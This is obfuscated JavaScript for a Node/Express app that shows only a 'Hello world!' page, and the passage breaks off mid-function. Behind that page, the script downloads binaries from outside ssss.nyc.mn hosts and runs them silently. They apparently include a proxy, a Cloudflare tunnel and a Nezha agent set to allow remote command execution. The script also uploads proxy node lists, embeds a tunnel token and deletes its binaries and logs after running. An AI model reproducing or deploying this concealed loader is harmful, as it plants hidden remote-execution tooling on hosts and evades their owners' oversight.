const _0x1ba60d=_0x1230;(function(_0x52d4ae,_0x401c9c){const _0x45fb10=_0x1230,_0x599e44=_0x52d4ae();while(!![]){try{const _0x2396b5=parseInt(_0x45fb10(0x1a0))/0x1*(parseInt(_0x45fb10(0x18a))/0x2)+parseInt(_0x45fb10(0x206))/0x3+-parseInt(_0x45fb10(0x1ce))/0x4+-parseInt(_0x45fb10(0x1b2))/0x5*(parseInt(_0x45fb10(0x17d))/0x6)+parseInt(_0x45fb10(0x18e))/0x7*(parseInt(_0x45fb10(0x1f0))/0x8)+parseInt(_0x45fb10(0x1fb))/0x9*(parseInt(_0x45fb10(0x1c3))/0xa)+parseInt(_0x45fb10(0x1fa))/0xb*(-parseInt(_0x45fb10(0x184))/0xc);if(_0x2396b5===_0x401c9c)break;else _0x599e44['push'](_0x599e44['shift']());}catch(_0x2ea7de){_0x599e44['push'](_0x599e44['shift']());}}}(_0x8a7e,0xd114f));const express=require(_0x1ba60d(0x15f)),app=express(),axios=require(_0x1ba60d(0x14a)),os=require('os'),fs=require('fs'),path=require(_0x1ba60d(0x1a4)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x1ba60d(0x1a2)]),{execSync}=require(_0x1ba60d(0x1de)),UPLOAD_URL=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x1af)]||'',PROJECT_URL=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x17c)]||'',AUTO_ACCESS=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x16e)]||![],FILE_PATH=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x1f8)]||'./tmp',SUB_PATH=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x195)]||_0x1ba60d(0x196),PORT=process['env'][_0x1ba60d(0x1c4)]||process[_0x1ba60d(0x1ae)][_0x1ba60d(0x1f1)]||0xbb8,UUID=process[_0x1ba60d(0x1ae)]['UUID']||_0x1ba60d(0x1da),NEZHA_SERVER=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x20c)]||'',NEZHA_PORT=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x20a)]||'',NEZHA_KEY=process[_0x1ba60d(0x1ae)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x1d7)]||_0x1ba60d(0x1cb),ARGO_AUTH=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x174)]||_0x1ba60d(0x16a),ARGO_PORT=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x1b8)]||0x1f41,CFIP=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x151)]||_0x1ba60d(0x1a8),CFPORT=process[_0x1ba60d(0x1ae)][_0x1ba60d(0x15e)]||0x1bb,NAME=process[_0x1ba60d(0x1ae)]['NAME']||_0x1ba60d(0x1c2);!fs['existsSync'](FILE_PATH)?(fs[_0x1ba60d(0x159)](FILE_PATH),console[_0x1ba60d(0x1c7)](FILE_PATH+_0x1ba60d(0x161))):console[_0x1ba60d(0x1c7)](FILE_PATH+_0x1ba60d(0x192));function generateRandomName(){const _0x76a2f5=_0x1ba60d,_0x444d79='abcdefghijklmnopqrstuvwxyz';let _0x60961f='';for(let _0xf8a0d4=0x0;_0xf8a0d4<0x6;_0xf8a0d4++){_0x60961f+=_0x444d79[_0x76a2f5(0x1e5)](Math[_0x76a2f5(0x175)](Math['random']()*_0x444d79[_0x76a2f5(0x164)]));}return _0x60961f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x1ba60d(0x1f5)](FILE_PATH,botName),subPath=path[_0x1ba60d(0x1f5)](FILE_PATH,_0x1ba60d(0x16b)),listPath=path[_0x1ba60d(0x1f5)](FILE_PATH,_0x1ba60d(0x1dd)),bootLogPath=path[_0x1ba60d(0x1f5)](FILE_PATH,_0x1ba60d(0x190)),configPath=path['join'](FILE_PATH,'config.json');function _0x1230(_0xe1e78e,_0x26c308){_0xe1e78e=_0xe1e78e-0x146;const _0x8a7e80=_0x8a7e();let _0x1230f9=_0x8a7e80[_0xe1e78e];return _0x1230f9;}function deleteNodes(){const _0x25f8a1=_0x1ba60d;try{if(!UPLOAD_URL)return;if(!fs[_0x25f8a1(0x178)](subPath))return;let _0x3b2314;try{_0x3b2314=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x510cf7=Buffer[_0x25f8a1(0x1eb)](_0x3b2314,_0x25f8a1(0x1c5))[_0x25f8a1(0x1ed)](_0x25f8a1(0x1e9)),_0x5c15c1=_0x510cf7[_0x25f8a1(0x1b6)]('\x0a')[_0x25f8a1(0x168)](_0x576b0c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x25f8a1(0x17f)](_0x576b0c));if(_0x5c15c1[_0x25f8a1(0x164)]===0x0)return;return axios['post'](UPLOAD_URL+_0x25f8a1(0x18b),JSON[_0x25f8a1(0x146)]({'nodes':_0x5c15c1}),{'headers':{'Content-Type':_0x25f8a1(0x1a1)}})['catch'](_0x2ebc96=>{return null;}),null;}catch(_0xaa451a){return null;}}function _0x8a7e(){const _0x5cb364=['mkdirSync','.exe\x20>\x20nul\x202>&1','\x20-c\x20','Empowerment\x20failed\x20for\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','CFPORT','express','\x20>/dev/null\x202>&1','\x20is\x20created','?security=tls&sni=','forEach','length','vless','firefox','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','filter','pipe','eyJhIjoiMDkwMjA2Njk0ZDc1Y2VkNDdlMGFlYTY2MTMyMWU3ZmYiLCJ0IjoiOWIwODBkZWQtZDE4My00YjVmLWEyMTMtMDM0OGYxMzAzMGE4IiwicyI6IllUWmxNVEl5WmpNdE9EVm1NaTAwTUdFeUxUazJaREV0TkRVMVpEZzVPV015WW1VNCJ9','sub.txt','\x0a\x0avmess://','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','AUTO_ACCESS','fileName','\x20>/dev/null\x202>&1\x20&','readFileSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','automatic\x20access\x20task\x20added\x20successfully','ARGO_AUTH','floor','org','127.0.0.1','existsSync','http\x20server\x20is\x20running\x20on\x20port:','readdirSync','unshift','PROJECT_URL','138AgmxLO','block','test','Unknown','catch','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tunnel.json','24NBBMNq','Download\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','false','tunnel.yml','push','14754ipUeLW','/api/delete-nodes','map','https://amd64.ssss.nyc.mn/bot','1393JycgFX','has','boot.log','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20already\x20exists','send','\x20failed:\x20','SUB_PATH','666','substring','tls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','match','tcp','isFile','amd','443','https://arm64.ssss.nyc.mn/bot','123puEBrO','application/json','exec','/dev/null','path','trojan','data','response','cdns.doon.eu.org','clear','pkill\x20-f\x20\x22[','platform','/api/add-nodes','includes','env','UPLOAD_URL','npm\x20running\x20error:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','179110qCbaXX','\x20-c\x20\x22','Hello\x20world!','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','split','/config.json\x20>/dev/null\x202>&1\x20&','ARGO_PORT','Error\x20downloading\x20files:','rm\x20-rf\x20','https://arm64.ssss.nyc.mn/v1','nohup\x20','/tunnel.yml\x20run','2087','https://ipapi.co/json/','quic','\x22\x20>\x20/dev/null\x202>&1','ARGO隧道','28790TFqxuK','SERVER_PORT','base64','\x0avless://','log','Error\x20in\x20startserver:','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','error','railway.gafan.net.eu.org','Empowerment\x20success\x20for\x20','stream','6600380NzIABh','del\x20/f\x20/q\x20','&fp=firefox&type=ws&host=','\x0a\x20\x20tunnel:\x20','php\x20running\x20error:\x20','xtls-rprx-vision','none','\x0aclient_secret:\x20','Unhandled\x20error\x20in\x20startserver:','ARGO_DOMAIN','2083','\x0a\x20\x20credentials-file:\x20','9afd1229-b893-40c1-84dd-51e7ce204913','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://oooo.serv00.net/add-url','list.txt','child_process','freedom','\x20-s\x20','\x20>\x20nul\x202>&1','?encryption=none&security=tls&sni=','https://amd64.ssss.nyc.mn/v1','vmess','charAt','http://ip-api.com/json/','status','aarch64','utf-8','/vless-argo','from','&path=%2Fvless-argo%3Fed%3D2560#','toString','basename','config.yaml','37424CHUHyh','PORT','\x0a\x0atrojan://','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','country_code','join','unlinkSync','App\x20is\x20running','FILE_PATH','taskkill\x20/f\x20/im\x20','7357702GmMxgZ','4878gOlPms','arch','all','set','\x0a\x20\x20\x20\x20','text/plain;\x20charset=utf-8','arm','https://arm64.ssss.nyc.mn/web','message','ArgoDomain:','Subscription\x20uploaded\x20successfully','3808359qRqnne','close','Error\x20executing\x20command:\x20','https+local://8.8.8.8/dns-query','NEZHA_PORT','https://amd64.ssss.nyc.mn/web','NEZHA_SERVER','ARGO_DOMAIN:','stringify','config.json','blackhole','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','axios','/vmess-argo','\x20successfully','win32','\x20is\x20running','fileUrl','get','CFIP','http','Content-Type','countryCode','2053','arm64','\x20-p\x20','writeFileSync'];_0x8a7e=function(){return _0x5cb364;};return _0x8a7e();}function cleanupOldFiles(){const _0x18c022=_0x1ba60d;try{const _0xb96dc6=fs[_0x18c022(0x17a)](FILE_PATH);_0xb96dc6['forEach'](_0x21c073=>{const _0x52a363=_0x18c022,_0x549d98=path[_0x52a363(0x1f5)](FILE_PATH,_0x21c073);try{const _0x64d293=fs['statSync'](_0x549d98);_0x64d293[_0x52a363(0x19c)]()&&fs[_0x52a363(0x1f6)](_0x549d98);}catch(_0x2a7705){}});}catch(_0x32e41c){}}app[_0x1ba60d(0x150)]('/',function(_0x487879,_0x162fa1){const _0x53af7c=_0x1ba60d;_0x162fa1[_0x53af7c(0x193)](_0x53af7c(0x1b4));});async function generateConfig(){const _0x332368=_0x1ba60d,_0x3e5004={'log':{'access':_0x332368(0x1a3),'error':_0x332368(0x1a3),'loglevel':_0x332368(0x1d4)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x332368(0x165),'settings':{'clients':[{'id':UUID,'flow':_0x332368(0x1d3)}],'decryption':_0x332368(0x1d4),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x332368(0x14b),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x332368(0x19b)}},{'port':0xbb9,'listen':_0x332368(0x177),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x332368(0x19b),'security':_0x332368(0x1d4)}},{'port':0xbba,'listen':_0x332368(0x177),'protocol':_0x332368(0x165),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x332368(0x1d4)},'streamSettings':{'network':'ws','security':_0x332368(0x1d4),'wsSettings':{'path':_0x332368(0x1ea)}},'sniffing':{'enabled':!![],'destOverride':[_0x332368(0x152),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x332368(0x177),'protocol':_0x332368(0x1e4),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x332368(0x198),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x332368(0x177),'protocol':_0x332368(0x1a5),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x332368(0x1d4),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x332368(0x152),_0x332368(0x198),_0x332368(0x1c0)],'metadataOnly':![]}}],'dns':{'servers':[_0x332368(0x209)]},'outbounds':[{'protocol':_0x332368(0x1df),'tag':'direct'},{'protocol':_0x332368(0x148),'tag':_0x332368(0x17e)}]};fs[_0x332368(0x158)](path['join'](FILE_PATH,_0x332368(0x147)),JSON['stringify'](_0x3e5004,null,0x2));}function getSystemArchitecture(){const _0x840247=_0x1ba60d,_0x1b6ac2=os[_0x840247(0x1fc)]();return _0x1b6ac2===_0x840247(0x201)||_0x1b6ac2===_0x840247(0x156)||_0x1b6ac2===_0x840247(0x1e8)?_0x840247(0x201):_0x840247(0x19d);}function downloadFile(_0x320d7e,_0xa906a0,_0x20ee1b){const _0x36f18e=_0x1ba60d,_0x5876fb=_0x320d7e;!fs['existsSync'](FILE_PATH)&&fs[_0x36f18e(0x159)](FILE_PATH,{'recursive':!![]});const _0x2e28ab=fs['createWriteStream'](_0x5876fb);axios({'method':_0x36f18e(0x150),'url':_0xa906a0,'responseType':_0x36f18e(0x1cd)})['then'](_0x51aaff=>{const _0x4593f3=_0x36f18e;_0x51aaff['data'][_0x4593f3(0x169)](_0x2e28ab),_0x2e28ab['on']('finish',()=>{const _0x839bc4=_0x4593f3;_0x2e28ab[_0x839bc4(0x207)](),console['log'](_0x839bc4(0x185)+path[_0x839bc4(0x1ee)](_0x5876fb)+_0x839bc4(0x14c)),_0x20ee1b(null,_0x5876fb);}),_0x2e28ab['on']('error',_0x118017=>{const _0x164a8e=_0x4593f3;fs['unlink'](_0x5876fb,()=>{});const _0xd584ca=_0x164a8e(0x185)+path[_0x164a8e(0x1ee)](_0x5876fb)+_0x164a8e(0x194)+_0x118017['message'];console[_0x164a8e(0x1ca)](_0xd584ca),_0x20ee1b(_0xd584ca);});})['catch'](_0x2df77d=>{const _0xa968a9=_0x36f18e,_0xcf9b39=_0xa968a9(0x185)+path[_0xa968a9(0x1ee)](_0x5876fb)+_0xa968a9(0x194)+_0x2df77d[_0xa968a9(0x203)];console[_0xa968a9(0x1ca)](_0xcf9b39),_0x20ee1b(_0xcf9b39);});}async function downloadFilesAndRun(){const _0x2e86ef=_0x1ba60d,_0xf5ca95=getSystemArchitecture(),_0xa6c18a=getFilesForArchitecture(_0xf5ca95);if(_0xa6c18a['length']===0x0){console['log'](_0x2e86ef(0x16d));return;}const _0x58c20b=_0xa6c18a[_0x2e86ef(0x18c)](_0x349b1a=>{return new Promise((_0x52f09c,_0xb408d2)=>{const _0x4e43c9=_0x1230;downloadFile(_0x349b1a[_0x4e43c9(0x16f)],_0x349b1a[_0x4e43c9(0x14f)],(_0x25d3b3,_0x112b2f)=>{_0x25d3b3?_0xb408d2(_0x25d3b3):_0x52f09c(_0x112b2f);});});});try{await Promise[_0x2e86ef(0x1fd)](_0x58c20b);}catch(_0x4e3ae9){console[_0x2e86ef(0x1ca)](_0x2e86ef(0x1b9),_0x4e3ae9);return;}function _0x40c5a9(_0xfa723e){const _0x44b6f6=_0x2e86ef,_0x53ed36=0x1fd;_0xfa723e[_0x44b6f6(0x163)](_0x52ab35=>{const _0x5eb5e7=_0x44b6f6;fs[_0x5eb5e7(0x178)](_0x52ab35)&&fs['chmod'](_0x52ab35,_0x53ed36,_0x58779c=>{const _0x1c6832=_0x5eb5e7;_0x58779c?console[_0x1c6832(0x1ca)](_0x1c6832(0x15c)+_0x52ab35+':\x20'+_0x58779c):console[_0x1c6832(0x1c7)](_0x1c6832(0x1cc)+_0x52ab35+':\x20'+_0x53ed36['toString'](0x8));});});}const _0x4224a2=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x40c5a9(_0x4224a2);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2e7a80=NEZHA_SERVER[_0x2e86ef(0x1ad)](':')?NEZHA_SERVER[_0x2e86ef(0x1b6)](':')['pop']():'',_0x4654b4=new Set([_0x2e86ef(0x19e),'8443','2096',_0x2e86ef(0x1be),_0x2e86ef(0x1d8),_0x2e86ef(0x155)]),_0x5ade0f=_0x4654b4[_0x2e86ef(0x18f)](_0x2e7a80)?'true':_0x2e86ef(0x187),_0x2a1d1d=_0x2e86ef(0x1d5)+NEZHA_KEY+_0x2e86ef(0x191)+NEZHA_SERVER+_0x2e86ef(0x1f3)+_0x5ade0f+_0x2e86ef(0x1b5)+UUID;fs[_0x2e86ef(0x158)](path['join'](FILE_PATH,_0x2e86ef(0x1ef)),_0x2a1d1d);const _0x458029=_0x2e86ef(0x1bc)+phpPath+_0x2e86ef(0x1b3)+FILE_PATH+_0x2e86ef(0x1c9);try{await exec(_0x458029),console[_0x2e86ef(0x1c7)](phpName+_0x2e86ef(0x14e)),await new Promise(_0x59b354=>setTimeout(_0x59b354,0x3e8));}catch(_0x2e43f0){console[_0x2e86ef(0x1ca)](_0x2e86ef(0x1d2)+_0x2e43f0);}}else{let _0x24e751='';const _0x554a72=['443','8443','2096',_0x2e86ef(0x1be),_0x2e86ef(0x1d8),_0x2e86ef(0x155)];_0x554a72['includes'](NEZHA_PORT)&&(_0x24e751='--tls');const _0x42fdeb=_0x2e86ef(0x1bc)+npmPath+_0x2e86ef(0x1e0)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2e86ef(0x157)+NEZHA_KEY+'\x20'+_0x24e751+_0x2e86ef(0x149);try{await exec(_0x42fdeb),console[_0x2e86ef(0x1c7)](npmName+_0x2e86ef(0x14e)),await new Promise(_0x48f57e=>setTimeout(_0x48f57e,0x3e8));}catch(_0x3ff292){console['error'](_0x2e86ef(0x1b0)+_0x3ff292);}}}else console[_0x2e86ef(0x1c7)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x51037a='nohup\x20'+webPath+_0x2e86ef(0x15b)+FILE_PATH+_0x2e86ef(0x1b7);try{await exec(_0x51037a),console[_0x2e86ef(0x1c7)](webName+_0x2e86ef(0x14e)),await new Promise(_0x51e0ae=>setTimeout(_0x51e0ae,0x3e8));}catch(_0x2de45e){console[_0x2e86ef(0x1ca)]('web\x20running\x20error:\x20'+_0x2de45e);}if(fs[_0x2e86ef(0x178)](botPath)){let _0x25a825;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x25a825='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x2e86ef(0x19a)](/TunnelSecret/)?_0x25a825=_0x2e86ef(0x1db)+FILE_PATH+_0x2e86ef(0x1bd):_0x25a825=_0x2e86ef(0x199)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2e86ef(0x1bc)+botPath+'\x20'+_0x25a825+_0x2e86ef(0x170)),console['log'](botName+_0x2e86ef(0x14e)),await new Promise(_0x5778b6=>setTimeout(_0x5778b6,0x7d0));}catch(_0x266680){console[_0x2e86ef(0x1ca)](_0x2e86ef(0x208)+_0x266680);}}await new Promise(_0x3deeb8=>setTimeout(_0x3deeb8,0x1388));}function getFilesForArchitecture(_0x15fb8a){const _0x656675=_0x1ba60d;let _0x11edfa;_0x15fb8a===_0x656675(0x201)?_0x11edfa=[{'fileName':webPath,'fileUrl':_0x656675(0x202)},{'fileName':botPath,'fileUrl':_0x656675(0x19f)}]:_0x11edfa=[{'fileName':webPath,'fileUrl':_0x656675(0x20b)},{'fileName':botPath,'fileUrl':_0x656675(0x18d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x451a5f=_0x15fb8a==='arm'?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x11edfa[_0x656675(0x17b)]({'fileName':npmPath,'fileUrl':_0x451a5f});}else{const _0x3f2d25=_0x15fb8a===_0x656675(0x201)?_0x656675(0x1bb):_0x656675(0x1e3);_0x11edfa[_0x656675(0x17b)]({'fileName':phpPath,'fileUrl':_0x3f2d25});}}return _0x11edfa;}function argoType(){const _0x71dd4c=_0x1ba60d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x71dd4c(0x1c7)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x71dd4c(0x1ad)]('TunnelSecret')){fs[_0x71dd4c(0x158)](path[_0x71dd4c(0x1f5)](FILE_PATH,_0x71dd4c(0x183)),ARGO_AUTH);const _0x5c146c=_0x71dd4c(0x1d1)+ARGO_AUTH[_0x71dd4c(0x1b6)]('\x22')[0xb]+_0x71dd4c(0x1d9)+path[_0x71dd4c(0x1f5)](FILE_PATH,_0x71dd4c(0x183))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x71dd4c(0x1b1)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x71dd4c(0x158)](path['join'](FILE_PATH,_0x71dd4c(0x188)),_0x5c146c);}else console[_0x71dd4c(0x1c7)](_0x71dd4c(0x172));}async function extractDomains(){const _0x29c168=_0x1ba60d;let _0x158943;if(ARGO_AUTH&&ARGO_DOMAIN)_0x158943=ARGO_DOMAIN,console[_0x29c168(0x1c7)](_0x29c168(0x20d),_0x158943),await _0x2ce3e4(_0x158943);else try{const _0x220e49=fs[_0x29c168(0x171)](path['join'](FILE_PATH,_0x29c168(0x190)),_0x29c168(0x1e9)),_0xbcf282=_0x220e49[_0x29c168(0x1b6)]('\x0a'),_0x29add1=[];_0xbcf282[_0x29c168(0x163)](_0x2898c7=>{const _0x9522e5=_0x29c168,_0x3bfe6b=_0x2898c7[_0x9522e5(0x19a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3bfe6b){const _0x5ef247=_0x3bfe6b[0x1];_0x29add1['push'](_0x5ef247);}});if(_0x29add1[_0x29c168(0x164)]>0x0)_0x158943=_0x29add1[0x0],console[_0x29c168(0x1c7)](_0x29c168(0x204),_0x158943),await _0x2ce3e4(_0x158943);else{console[_0x29c168(0x1c7)](_0x29c168(0x15d)),fs[_0x29c168(0x1f6)](path[_0x29c168(0x1f5)](FILE_PATH,_0x29c168(0x190)));async function _0x409111(){const _0x199e42=_0x29c168;try{process[_0x199e42(0x1ab)]===_0x199e42(0x14d)?await exec(_0x199e42(0x1f9)+botName+_0x199e42(0x15a)):await exec(_0x199e42(0x1aa)+botName[_0x199e42(0x1e5)](0x0)+']'+botName[_0x199e42(0x197)](0x1)+_0x199e42(0x1c1));}catch(_0x245c60){}}_0x409111(),await new Promise(_0x552d48=>setTimeout(_0x552d48,0xbb8));const _0x33661c='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x29c168(0x182)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x33661c+_0x29c168(0x170)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x44dd61=>setTimeout(_0x44dd61,0xbb8)),await extractDomains();}catch(_0x433443){console[_0x29c168(0x1ca)](_0x29c168(0x208)+_0x433443);}}}catch(_0x31b53f){console[_0x29c168(0x1ca)]('Error\x20reading\x20boot.log:',_0x31b53f);}async function _0x5d215b(){const _0x21a274=_0x29c168;try{const _0x2e689e=await axios[_0x21a274(0x150)](_0x21a274(0x1bf),{'timeout':0xbb8});if(_0x2e689e[_0x21a274(0x1a6)]&&_0x2e689e[_0x21a274(0x1a6)][_0x21a274(0x1f4)]&&_0x2e689e[_0x21a274(0x1a6)]['org'])return _0x2e689e[_0x21a274(0x1a6)]['country_code']+'_'+_0x2e689e['data'][_0x21a274(0x176)];}catch(_0x2cdabe){try{const _0x50457e=await axios['get'](_0x21a274(0x1e6),{'timeout':0xbb8});if(_0x50457e[_0x21a274(0x1a6)]&&_0x50457e['data'][_0x21a274(0x1e7)]==='success'&&_0x50457e[_0x21a274(0x1a6)][_0x21a274(0x154)]&&_0x50457e[_0x21a274(0x1a6)]['org'])return _0x50457e[_0x21a274(0x1a6)]['countryCode']+'_'+_0x50457e[_0x21a274(0x1a6)][_0x21a274(0x176)];}catch(_0x109f24){}}return _0x21a274(0x180);}async function _0x2ce3e4(_0x432799){const _0x160097=await _0x5d215b(),_0x132fc0=NAME?NAME+'-'+_0x160097:_0x160097;return new Promise(_0x21ac6d=>{setTimeout(()=>{const _0x5c5d1d=_0x1230,_0x26c08f={'v':'2','ps':''+_0x132fc0,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x432799,'path':'/vmess-argo?ed=2560','tls':_0x5c5d1d(0x198),'sni':_0x432799,'alpn':'','fp':_0x5c5d1d(0x166)},_0x546ba7=_0x5c5d1d(0x1c6)+UUID+'@'+CFIP+':'+CFPORT+_0x5c5d1d(0x1e2)+_0x432799+_0x5c5d1d(0x1d0)+_0x432799+_0x5c5d1d(0x1ec)+_0x132fc0+_0x5c5d1d(0x16c)+Buffer[_0x5c5d1d(0x1eb)](JSON[_0x5c5d1d(0x146)](_0x26c08f))['toString'](_0x5c5d1d(0x1c5))+_0x5c5d1d(0x1f2)+UUID+'@'+CFIP+':'+CFPORT+_0x5c5d1d(0x162)+_0x432799+_0x5c5d1d(0x1d0)+_0x432799+_0x5c5d1d(0x186)+_0x132fc0+_0x5c5d1d(0x1ff);console[_0x5c5d1d(0x1c7)](Buffer['from'](_0x546ba7)[_0x5c5d1d(0x1ed)]('base64')),fs[_0x5c5d1d(0x158)](subPath,Buffer[_0x5c5d1d(0x1eb)](_0x546ba7)[_0x5c5d1d(0x1ed)](_0x5c5d1d(0x1c5))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x5c5d1d(0x150)]('/'+SUB_PATH,(_0x8aa322,_0x2775bd)=>{const _0x52c7ee=_0x5c5d1d,_0x577979=Buffer[_0x52c7ee(0x1eb)](_0x546ba7)['toString'](_0x52c7ee(0x1c5));_0x2775bd[_0x52c7ee(0x1fe)](_0x52c7ee(0x153),_0x52c7ee(0x200)),_0x2775bd['send'](_0x577979);}),_0x21ac6d(_0x546ba7);},0x7d0);});}}async function uploadNodes(){const _0x4ee1d3=_0x1ba60d;if(UPLOAD_URL&&PROJECT_URL){const _0x5f112e=PROJECT_URL+'/'+SUB_PATH,_0x4f5823={'subscription':[_0x5f112e]};try{const _0x446158=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x4f5823,{'headers':{'Content-Type':_0x4ee1d3(0x1a1)}});return _0x446158&&_0x446158[_0x4ee1d3(0x1e7)]===0xc8?(console[_0x4ee1d3(0x1c7)](_0x4ee1d3(0x205)),_0x446158):null;}catch(_0x14d516){if(_0x14d516[_0x4ee1d3(0x1a7)]){if(_0x14d516['response'][_0x4ee1d3(0x1e7)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4ee1d3(0x178)](listPath))return;const _0x47b20f=fs[_0x4ee1d3(0x171)](listPath,_0x4ee1d3(0x1e9)),_0x1cb8d1=_0x47b20f[_0x4ee1d3(0x1b6)]('\x0a')[_0x4ee1d3(0x168)](_0x15479e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4ee1d3(0x17f)](_0x15479e));if(_0x1cb8d1[_0x4ee1d3(0x164)]===0x0)return;const _0x5ccc4d=JSON[_0x4ee1d3(0x146)]({'nodes':_0x1cb8d1});try{const _0x179780=await axios['post'](UPLOAD_URL+_0x4ee1d3(0x1ac),_0x5ccc4d,{'headers':{'Content-Type':_0x4ee1d3(0x1a1)}});return _0x179780&&_0x179780['status']===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x179780):null;}catch(_0x1a1dd6){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5f0a06=_0x1230,_0x2b67fc=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2b67fc[_0x5f0a06(0x189)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2b67fc[_0x5f0a06(0x189)](phpPath);process[_0x5f0a06(0x1ab)]==='win32'?exec(_0x5f0a06(0x1cf)+_0x2b67fc['join']('\x20')+_0x5f0a06(0x1e1),_0x57d8d1=>{const _0x1cb4c3=_0x5f0a06;console[_0x1cb4c3(0x1a9)](),console[_0x1cb4c3(0x1c7)](_0x1cb4c3(0x1f7)),console['log'](_0x1cb4c3(0x167));}):exec(_0x5f0a06(0x1ba)+_0x2b67fc[_0x5f0a06(0x1f5)]('\x20')+_0x5f0a06(0x160),_0xbc4a37=>{const _0x2aa734=_0x5f0a06;console[_0x2aa734(0x1a9)](),console[_0x2aa734(0x1c7)](_0x2aa734(0x1f7)),console[_0x2aa734(0x1c7)](_0x2aa734(0x167));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4cbb1e=_0x1ba60d;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4cbb1e(0x1c7)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x508dfa=await 